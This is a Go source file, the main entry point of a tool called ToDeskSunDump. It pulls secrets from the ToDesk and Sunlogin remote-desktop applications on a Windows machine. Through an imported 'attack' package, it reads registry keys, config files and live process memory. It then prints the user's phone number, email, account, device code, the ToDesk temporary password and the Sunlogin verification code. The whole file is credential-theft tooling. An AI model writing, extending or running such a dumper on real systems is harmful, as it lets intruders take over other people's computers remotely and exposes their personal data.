package main

import (
	"ToDeskSunDump/attack"
	"ToDeskSunDump/util"
	"flag"
	"fmt"
	"os"
)

func main() {
	var SunDumpStatus bool
	var ToDeskDumpStatus bool

	flag.BoolVar(&ToDeskDumpStatus, "a", false, "获取ToDesk信息")
	flag.BoolVar(&SunDumpStatus, "b", false, "获取向日葵信息")
	flag.Parse()
	isInputParam()

	ToDeskDump(ToDeskDumpStatus)
	SunDump(SunDumpStatus)
}

func isInputParam() {
	if flag.NFlag() == 0 || (flag.NFlag() == 1 && flag.NArg() == 1 && flag.Arg(0) == "-h") {
		flag.PrintDefaults()
	}
}

func ToDeskDump(ToDeskDumpStatus bool) {
	if ToDeskDumpStatus {
		var registryInfoMap, configInfoMap, memoryInfoMap map[string]string

		installStatus := attack.IsInstalled(util.AppKeywordsToDesk)
		if !installStatus {
			fmt.Println("未找到ToDesk应用程序")
			os.Exit(1)
		}

		registryInfoMap = attack.ReadRegistryInfo(util.AppKeywordsToDesk, util.KeywordsToDesk)
		configInfoMap = attack.ReadConfigFile(registryInfoMap["配置文件路径"], util.KeywordsToDesk)

		runStatus := attack.IsRunning(util.ProcessKeywordsToDesk)
		if runStatus {
			memoryInfoMap = attack.ReadMemoryInfo(util.KeywordsToDesk, util.ProcessKeywordsToDesk)
		} else {
			fmt.Println("未找到ToDesk进程")
		}

		toDeskFormatPrintf(registryInfoMap, configInfoMap, memoryInfoMap)
	}
}

func SunDump(SunDumpStatus bool) {
	if SunDumpStatus {
		var registryInfoMap, configInfoMap, memoryInfoMap map[string]string

		installStatus := attack.IsInstalled(util.AppKeywordsSun)
		if !installStatus {
			fmt.Println("未找到向日葵应用程序")
			os.Exit(1)
		}

		registryInfoMap = attack.ReadRegistryInfo(util.AppKeywordsSun, util.KeywordsSun)
		configInfoMap = attack.ReadConfigFile(registryInfoMap["配置文件路径"], util.KeywordsSun)

		runStatus := attack.IsRunning(util.ProcessKeywordsSun)
		if runStatus {
			memoryInfoMap = attack.ReadMemoryInfo(util.KeywordsSun, util.ProcessKeywordsSun)
		} else {
			fmt.Println("未找到向日葵进程")
		}

		sunFormatPrintf(registryInfoMap, configInfoMap, memoryInfoMap)
	}
}

func toDeskFormatPrintf(registryInfoMap, configInfoMap, memoryInfoMap map[string]string) {
	fmt.Println("------------------------------------------")
	fmt.Println("软件名称:", util.ToDeskName)
	fmt.Println("程序路径:", registryInfoMap["程序路径"])
	fmt.Println("安装路径:", registryInfoMap["安装路径"])
	fmt.Println("配置文件路径:", registryInfoMap["配置文件路径"])
	fmt.Println("用户路径:", registryInfoMap["用户路径"])
	fmt.Println("版本号:", configInfoMap["版本号"])
	fmt.Println("手机号:", configInfoMap["手机号"])
	fmt.Println("邮箱:", configInfoMap["邮箱"])
	fmt.Println("登录规则:", configInfoMap["登录规则"])
	fmt.Println("设备代码:", configInfoMap["设备代码"])
	fmt.Println("临时密码:", memoryInfoMap["临时密码"])
	fmt.Println("------------------------------------------")
}

func sunFormatPrintf(registryInfoMap, configInfoMap, memoryInfoMap map[string]string) {
	fmt.Println("------------------------------------------")
	fmt.Println("软件名称:", util.SunName)
	fmt.Println("程序路径:", registryInfoMap["程序路径"])
	fmt.Println("安装路径:", registryInfoMap["安装路径"])
	fmt.Println("配置文件路径:", registryInfoMap["配置文件路径"])
	fmt.Println("账号:", configInfoMap["账号"])
	fmt.Println("版本号:", configInfoMap["版本号"])
	fmt.Println("设备识别码:", memoryInfoMap["设备识别码"])
	fmt.Println("验证码:", memoryInfoMap["验证码"])
	fmt.Println("------------------------------------------")
}
